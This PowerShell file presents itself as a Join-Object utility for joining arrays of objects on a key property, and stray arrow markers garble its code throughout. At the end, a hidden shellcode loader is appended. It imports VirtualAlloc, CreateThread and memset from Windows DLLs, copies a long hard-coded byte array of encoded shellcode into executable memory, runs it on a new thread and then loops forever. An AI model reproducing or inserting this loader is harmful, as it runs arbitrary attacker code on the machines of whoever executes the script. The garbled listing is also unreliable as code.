 -||-> function Join-Object
{
    
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeLine = $true)]
        [object[]] $Left,

        
        [Parameter(Mandatory=$true)]
        [object[]] $Right,

        [Parameter(Mandatory = $true)]
        [string] $LeftJoinProperty,

        [Parameter(Mandatory = $true)]
        [string] $RightJoinProperty,

        [object[]]$LeftProperties = '*',

        
        
        [object[]]$RightProperties = '*',

        [validateset( 'AllInLeft', 'OnlyIfInBoth', 'AllInBoth', 'AllInRight')]
        [Parameter(Mandatory=$false)]
        [string]$Type = 'AllInLeft',

        [string]$Prefix,
        [string]$Suffix
    )
    Begin
    {
         -||-> function AddItemProperties($item, $properties, $hash)
        {
             -||-> if ( -||-> $null -eq $item <-||- )
            {
                return
            } <-||- 

             -||-> foreach($property in  -||-> $properties <-||- )
            {
                 -||-> $propertyHash = $property -as [hashtable] <-||- 
                 -||-> if( -||-> $null -ne $propertyHash <-||- )
                {
                     -||-> $hashName = $propertyHash["name"] -as [string] <-||-          
                     -||-> $expression = $propertyHash["expression"] -as [scriptblock] <-||- 

                     -||-> $expressionValue = $expression.Invoke($item)[0] <-||- 
            
                     -||-> $hash[$hashName] = $expressionValue <-||- 
                }
                else
                {
                     -||-> foreach($itemProperty in  -||-> $item.psobject.Properties <-||- )
                    {
                         -||-> if ( -||-> $itemProperty.Name -like $property <-||- )
                        {
                             -||-> $hash[$itemProperty.Name] = $itemProperty.Value <-||- 
                        } <-||- 
                    } <-||- 
                } <-||- 
            } <-||- 
        } <-||- 

         -||-> function TranslateProperties
        {
            [cmdletbinding()]
            param(
                [object[]]$Properties,
                [psobject]$RealObject,
                [string]$Side)

             -||-> foreach($Prop in  -||-> $Properties <-||- )
            {
                 -||-> $propertyHash = $Prop -as [hashtable] <-||- 
                 -||-> if( -||-> $null -ne $propertyHash <-||- )
                {
                     -||-> $hashName = $propertyHash["name"] -as [string] <-||-          
                     -||-> $expression = $propertyHash["expression"] -as [scriptblock] <-||- 

                     -||-> $ScriptString = $expression.tostring() <-||- 
                     -||-> if( -||-> $ScriptString -notmatch 'param\(' <-||- )
                    {
                         -||-> Write-Verbose "Property '$HashName'`: Adding param(`$_) to scriptblock '$ScriptString'" <-||- 
                         -||-> $Expression = [ScriptBlock]::Create("param(`$_)`n $ScriptString") <-||- 
                    } <-||- 
                
                     -||-> $Output = @{Name = -||-> $HashName <-||- ; Expression =  -||-> $Expression <-||-  } <-||- 
                     -||-> Write-Verbose "Found $Side property hash with name $( -||-> $Output.Name <-||- ), expression:`n$( -||-> $Output.Expression | out-string <-||- )" <-||- 
                     -||-> $Output <-||- 
                }
                else
                {
                     -||-> foreach($ThisProp in  -||-> $RealObject.psobject.Properties <-||- )
                    {
                         -||-> if ( -||-> $ThisProp.Name -like $Prop <-||- )
                        {
                             -||-> Write-Verbose "Found $Side property '$( -||-> $ThisProp.Name <-||- )'" <-||- 
                             -||-> $ThisProp.Name <-||- 
                        } <-||- 
                    } <-||- 
                } <-||- 
            } <-||- 
        } <-||- 

         -||-> function WriteJoinObjectOutput($leftItem, $rightItem, $leftProperties, $rightProperties)
        {
             -||-> $properties = @{} <-||- 

             -||-> AddItemProperties $leftItem $leftProperties $properties <-||- 
             -||-> AddItemProperties $rightItem $rightProperties $properties <-||- 

             -||-> New-Object psobject -Property $properties <-||- 
        } <-||- 

        
         -||-> foreach($Prop in  -||-> @( -||-> $LeftProperties + $RightProperties <-||- ) <-||- )
        {
             -||-> if( -||-> $Prop -as [hashtable] <-||- )
            {
                 -||-> foreach($variation in  -||-> ( -||-> 'n','label','l' <-||- ) <-||- )
                {
                     -||-> if( -||-> -not $Prop.ContainsKey('Name') <-||-  )
                    {
                         -||-> if( -||-> $Prop.ContainsKey($variation) <-||-  )
                        {
                             -||-> $Prop.Add('Name',$Prop[$Variation]) <-||- 
                        } <-||- 
                    } <-||- 
                } <-||- 
                 -||-> if( -||-> -not $Prop.ContainsKey('Name') -or $Prop['Name'] -like $null <-||-  )
                {
                    Throw  -||-> "Property is missing a name`n. This should be in calculated property format, with a Name and an Expression:`n@{Name='Something';Expression={`$_.Something}}`nAffected property:`n$( -||-> $Prop | out-string <-||- )" <-||- 
                } <-||- 


                 -||-> if( -||-> -not $Prop.ContainsKey('Expression') <-||-  )
                {
                     -||-> if( -||-> $Prop.ContainsKey('E') <-||-  )
                    {
                         -||-> $Prop.Add('Expression',$Prop['E']) <-||- 
                    } <-||- 
                } <-||- 
            
                 -||-> if( -||-> -not $Prop.ContainsKey('Expression') -or $Prop['Expression'] -like $null <-||-  )
                {
                    Throw  -||-> "Property is missing an expression`n. This should be in calculated property format, with a Name and an Expression:`n@{Name='Something';Expression={`$_.Something}}`nAffected property:`n$( -||-> $Prop | out-string <-||- )" <-||- 
                } <-||- 
            } <-||-         
        } <-||- 

         -||-> $leftHash = @{} <-||- 
         -||-> $rightHash = @{} <-||- 

        
         -||-> $nullKey =  -||-> New-Object psobject <-||-  <-||- 
        
         -||-> $bound = $PSBoundParameters.keys -contains "InputObject" <-||- 
         -||-> if( -||-> -not $bound <-||- )
        {
             -||-> [System.Collections.ArrayList]$LeftData = @() <-||- 
        } <-||- 
    }
    Process
    {
        
         -||-> if( -||-> $bound <-||- )
        {
             -||-> $LeftData = $Left <-||- 
        }
        Else
        {
             -||-> foreach($Object in  -||-> $Left <-||- )
            {
                 -||-> [void]$LeftData.add($Object) <-||- 
            } <-||- 
        } <-||- 
    }
    End
    {
         -||-> foreach ($item in  -||-> $Right <-||- )
        {
             -||-> $key = $item.$RightJoinProperty <-||- 

             -||-> if ( -||-> $null -eq $key <-||- )
            {
                 -||-> $key = $nullKey <-||- 
            } <-||- 

             -||-> $bucket = $rightHash[$key] <-||- 

             -||-> if ( -||-> $null -eq $bucket <-||- )
            {
                 -||-> $bucket =  -||-> New-Object System.Collections.ArrayList <-||-  <-||- 
                 -||-> $rightHash.Add($key, $bucket) <-||- 
            } <-||- 

             -||-> $null = $bucket.Add($item) <-||- 
        } <-||- 

         -||-> foreach ($item in  -||-> $LeftData <-||- )
        {
             -||-> $key = $item.$LeftJoinProperty <-||- 

             -||-> if ( -||-> $null -eq $key <-||- )
            {
                 -||-> $key = $nullKey <-||- 
            } <-||- 

             -||-> $bucket = $leftHash[$key] <-||- 

             -||-> if ( -||-> $null -eq $bucket <-||- )
            {
                 -||-> $bucket =  -||-> New-Object System.Collections.ArrayList <-||-  <-||- 
                 -||-> $leftHash.Add($key, $bucket) <-||- 
            } <-||- 

             -||-> $null = $bucket.Add($item) <-||- 
        } <-||- 

         -||-> $LeftProperties =  -||-> TranslateProperties -Properties $LeftProperties -Side 'Left' -RealObject $LeftData[0] <-||-  <-||- 
         -||-> $RightProperties =  -||-> TranslateProperties -Properties $RightProperties -Side 'Right' -RealObject $Right[0] <-||-  <-||- 

        
         -||-> [string[]]$AllProps = $LeftProperties <-||- 

        
         -||-> $RightProperties =  -||-> foreach($RightProp in  -||-> $RightProperties <-||- )
        {
             -||-> if( -||-> -not ( -||-> $RightProp -as [Hashtable] <-||- ) <-||- )
            {
                 -||-> Write-Verbose "Transforming property $RightProp to $Prefix$RightProp$Suffix" <-||- 
                 -||-> @{
                    Name= -||-> "$Prefix$RightProp$Suffix" <-||- 
                    Expression= -||-> [scriptblock]::create("param(`$_) `$_.'$RightProp'") <-||- 
                } <-||- 
                 -||-> $AllProps += "$Prefix$RightProp$Suffix" <-||- 
            }
            else
            {
                 -||-> Write-Verbose "Skipping transformation of calculated property with name $( -||-> $RightProp.Name <-||- ), expression:`n$( -||-> $RightProp.Expression | out-string <-||- )" <-||- 
                 -||-> $AllProps += [string]$RightProp["Name"] <-||- 
                 -||-> $RightProp <-||- 
            } <-||- 
        } <-||-  <-||- 

         -||-> $AllProps =  -||-> $AllProps | Select -Unique <-||-  <-||- 

         -||-> Write-Verbose "Combined set of properties: $( -||-> $AllProps -join ', ' <-||- )" <-||- 

         -||-> foreach ( $entry in  -||-> $leftHash.GetEnumerator() <-||-  )
        {
             -||-> $key = $entry.Key <-||- 
             -||-> $leftBucket = $entry.Value <-||- 

             -||-> $rightBucket = $rightHash[$key] <-||- 

             -||-> if ( -||-> $null -eq $rightBucket <-||- )
            {
                 -||-> if ( -||-> $Type -eq 'AllInLeft' -or $Type -eq 'AllInBoth' <-||- )
                {
                     -||-> foreach ($leftItem in  -||-> $leftBucket <-||- )
                    {
                         -||-> WriteJoinObjectOutput $leftItem $null $LeftProperties $RightProperties | Select $AllProps <-||- 
                    } <-||- 
                } <-||- 
            }
            else
            {
                 -||-> foreach ($leftItem in  -||-> $leftBucket <-||- )
                {
                     -||-> foreach ($rightItem in  -||-> $rightBucket <-||- )
                    {
                         -||-> WriteJoinObjectOutput $leftItem $rightItem $LeftProperties $RightProperties | Select $AllProps <-||- 
                    } <-||- 
                } <-||- 
            } <-||- 
        } <-||- 

         -||-> if ( -||-> $Type -eq 'AllInRight' -or $Type -eq 'AllInBoth' <-||- )
        {
             -||-> foreach ($entry in  -||-> $rightHash.GetEnumerator() <-||- )
            {
                 -||-> $key = $entry.Key <-||- 
                 -||-> $rightBucket = $entry.Value <-||- 

                 -||-> $leftBucket = $leftHash[$key] <-||- 

                 -||-> if ( -||-> $null -eq $leftBucket <-||- )
                {
                     -||-> foreach ($rightItem in  -||-> $rightBucket <-||- )
                    {
                         -||-> WriteJoinObjectOutput $null $rightItem $LeftProperties $RightProperties | Select $AllProps <-||- 
                    } <-||- 
                } <-||- 
            } <-||- 
        } <-||- 
    }
} <-||- 
 -||-> $nLR = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $nLR -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbf,0x48,0x09,0x09,0xdc,0xdb,0xc4,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x7d,0x13,0x83,0xc5,0x04,0x03,0x7d,0x47,0xeb,0xfc,0x20,0xbf,0x69,0xfe,0xd8,0x3f,0x0e,0x76,0x3d,0x0e,0x0e,0xec,0x35,0x20,0xbe,0x66,0x1b,0xcc,0x35,0x2a,0x88,0x47,0x3b,0xe3,0xbf,0xe0,0xf6,0xd5,0x8e,0xf1,0xab,0x26,0x90,0x71,0xb6,0x7a,0x72,0x48,0x79,0x8f,0x73,0x8d,0x64,0x62,0x21,0x46,0xe2,0xd1,0xd6,0xe3,0xbe,0xe9,0x5d,0xbf,0x2f,0x6a,0x81,0x77,0x51,0x5b,0x14,0x0c,0x08,0x7b,0x96,0xc1,0x20,0x32,0x80,0x06,0x0c,0x8c,0x3b,0xfc,0xfa,0x0f,0xea,0xcd,0x03,0xa3,0xd3,0xe2,0xf1,0xbd,0x14,0xc4,0xe9,0xcb,0x6c,0x37,0x97,0xcb,0xaa,0x4a,0x43,0x59,0x29,0xec,0x00,0xf9,0x95,0x0d,0xc4,0x9c,0x5e,0x01,0xa1,0xeb,0x39,0x05,0x34,0x3f,0x32,0x31,0xbd,0xbe,0x95,0xb0,0x85,0xe4,0x31,0x99,0x5e,0x84,0x60,0x47,0x30,0xb9,0x73,0x28,0xed,0x1f,0xff,0xc4,0xfa,0x2d,0xa2,0x80,0xcf,0x1f,0x5d,0x50,0x58,0x17,0x2e,0x62,0xc7,0x83,0xb8,0xce,0x80,0x0d,0x3e,0x31,0xbb,0xea,0xd0,0xcc,0x44,0x0b,0xf8,0x0a,0x10,0x5b,0x92,0xbb,0x19,0x30,0x62,0x44,0xcc,0xad,0x67,0xd2,0x43,0x21,0x5c,0xf1,0xf4,0x40,0x9c,0xf4,0xbf,0xcc,0x7a,0xa6,0xef,0x9e,0xd2,0x06,0x40,0x5f,0x83,0xee,0x8a,0x50,0xfc,0x0e,0xb5,0xba,0x95,0xa4,0x5a,0x13,0xcd,0x50,0xc2,0x3e,0x85,0xc1,0x0b,0x95,0xe3,0xc1,0x80,0x1a,0x13,0x8f,0x60,0x56,0x07,0x67,0x81,0x2d,0x75,0x21,0x9e,0x9b,0x10,0xcd,0x0a,0x20,0xb3,0x9a,0xa2,0x2a,0xe2,0xec,0x6c,0xd4,0xc1,0x67,0xa4,0x40,0xaa,0x1f,0xc9,0x84,0x2a,0xdf,0x9f,0xce,0x2a,0xb7,0x47,0xab,0x78,0xa2,0x87,0x66,0xed,0x7f,0x12,0x89,0x44,0x2c,0xb5,0xe1,0x6a,0x0b,0xf1,0xad,0x95,0x7e,0x03,0x91,0x43,0x46,0x71,0xfb,0x57 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $kuss=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $kuss.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$kuss,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



